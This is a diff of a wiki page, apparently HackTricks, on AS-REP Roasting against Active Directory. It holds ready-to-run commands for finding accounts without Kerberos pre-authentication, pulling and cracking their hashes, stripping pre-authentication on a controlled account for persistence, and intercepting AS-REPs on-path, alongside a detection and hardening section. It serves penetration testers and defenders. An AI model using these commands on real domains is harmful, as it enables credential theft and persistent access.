@@ -9,78 +9,151 @@ ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-
 The main requirements for this attack are:
 
 - **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **Connection to the Domain Controller (DC)**: Attackers need network access to at least one DC in order to send requests and receive encrypted messages.
+- **(Optional) Domain account**: Having a domain account allows attackers to enumerate vulnerable users through LDAP queries. Without such an account attackers must blindly guess usernames.
 
-#### Enumerating vulnerable users (need domain credentials)
+---
 
-```bash:Using Windows
-Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
+### Enumerating vulnerable users
+
+#### From a domain-joined context (LDAP)
+
+```powershell
+# PowerView (Windows)
+Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-```bash:Using Linux
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+```bash
+# bloodyAD (Linux)
+bloodyAD -u user -p 'Passw0rd!' -d crash.lab --host 10.100.10.5 get search \
+        --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
+        --attr sAMAccountName
 ```
 
-#### Request AS_REP message
+#### Without credentials (Kerbrute)
 
-```bash:Using Linux
-#Try all the usernames in usernames.txt
+`kerbrute` supports a **--no-preauth** switch that detects accounts vulnerable to AS-REP Roasting through response analysis:
+
+```bash
+kerbrute userenum --no-preauth -d jurassic.park usernames.txt -o found.txt
+```
+
+> Kerbrute observes whether the DC returns KRB5KDC_ERR_PREAUTH_REQUIRED (account **requires** pre-auth) or a full AS-REP (account **does not require** pre-auth).
+
+---
+
+### Requesting the AS-REP message
+
+```bash
+# Linux / Impacket
+# 1. Against a word-list of potential users (no creds required)
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-#Use domain creds to extract targets and target them
+
+# 2. Using domain credentials to pull only the vulnerable users
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
 
-```bash:Using Windows
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
-Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
+```powershell
+# Windows / Rubeus 2024+
+# The /nowrap switch avoids line wraps, /aes will request AES tickets if the account supports them
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes] [/nowrap]
+
+# Legacy PowerShell implementation
+Get-ASREPHash -Username VPN114user -Verbose   # (ASREPRoast.ps1)
 ```
 
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> AS-REP Roasting with Rubeus generates event **4768** (Ticket-Granting-Ticket requested) with **Pre-authentication Type = 0** and **Encryption Type 0x17 / 0x11 / 0x12** depending on the cipher negotiated.
 
-### Cracking
+---
 
-```bash
-john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
-```
+### Cracking the hash
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
-```bash:Using Windows
-Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
-```
-
-```bash:Using Linux
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
-```
-
-## ASREProast without credentials
-
-An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
+#### RC4-HMAC (etype 23 – most common)
 
 ```bash
-# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
-ASRepCatcher relay -dc $DC_IP
+hashcat -m 18200 hashes.asreproast wordlist.txt
+john --wordlist=wordlist.txt hashes.asreproast
+```
 
-# Disabling ARP spoofing, the mitm position must be obtained differently
-ASRepCatcher relay -dc $DC_IP --disable-spoofing
+#### AES (etype 17 / 18 – Windows Server 2019 defaults)
 
-# Passive listening of AS-REP packets, no packet alteration
+Since 2023, Hashcat includes native modules for AES-encrypted AS-REPs (32100 & 32200):
+
+```bash
+# AES-128-CTS-HMAC-SHA1-96 (etype 17)
+hashcat -m 32100 hashes.asreproast wordlist.txt
+
+# AES-256-CTS-HMAC-SHA1-96 (etype 18)
+hashcat -m 32200 hashes.asreproast wordlist.txt
+```
+
+John the Ripper already supports these formats:
+
+```bash
+john --format=krb5pa-sha1 hashes.asreproast --wordlist=wordlist.txt
+```
+
+> AES tickets are **significantly** harder to brute-force than RC4; cracking feasibility now almost entirely depends on password strength.
+
+---
+
+### Persistence / Weaponisation
+
+If you control an account (e.g. via GenericAll) you can **remove** pre-authentication to expose it to future roasting attempts:
+
+```powershell
+# Windows (PowerView)
+Set-DomainObject -Identity <username> -XOR @{userAccountControl = 4194304} -Verbose
+```
+
+```bash
+# Linux (bloodyAD)
+bloodyAD -u user -p 'Passw0rd!' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH target_user
+```
+
+---
+
+## Detection & Mitigation
+
+| What to look for | How |
+|------------------|-----|
+| Kerberos TGT requests **without** pre-authentication | Windows Security **Event ID 4768** where **Pre-Authentication Type = 0** |
+| Unusual encryption downgrades to **RC4 (0x17)** | Correlate Event ID 4768/4769 where *Ticket Encryption Type = 0x17* |
+| LDAP enumeration of `DONT_REQ_PREAUTH` accounts | Monitor directory-service logs for filters containing `4194304` |
+
+Alerting rules such as the Sigma rule `windows_kerberos_asrep_roast` implement this logic and are natively supported by most SIEM/SOAR platforms .
+
+Hardening recommendations:
+
+1. **Enforce pre-authentication** for *all* accounts:  
+   `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADUser -DoesNotRequirePreAuth $false`
+2. **Disable RC4 encryption** and require AES-only Kerberos where legacy compatibility permits.
+3. Apply **long, random service-account passwords** (ideally 25+ characters) or switch to **Group Managed Service Accounts (gMSA)**.
+4. Monitor Event ID 4738/5136 for changes to the `userAccountControl` flag.
+
+---
+
+## AS-REP Roasting without credentials (on-path)
+
+An attacker with a **man-in-the-middle** position can capture AS-REP packets for *any* user and optionally force weak ciphers.  [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) automates this:
+
+```bash
+# Actively proxy and RC4-downgrade Kerberos traffic
+ASRepCatcher relay --dc $DC_IP
+
+# Passive listening (no packet alteration)
 ASRepCatcher listen
 ```
+
+---
 
 ## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [https://github.com/hashcat/hashcat/blob/master/src/modules/module_32200.c](https://github.com/hashcat/hashcat/blob/master/src/modules/module_32200.c) 
+- [https://www.blumira.com/blog/how-to-detect-as-rep-roasting](https://www.blumira.com/blog/how-to-detect-as-rep-roasting) 
 
 ---
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
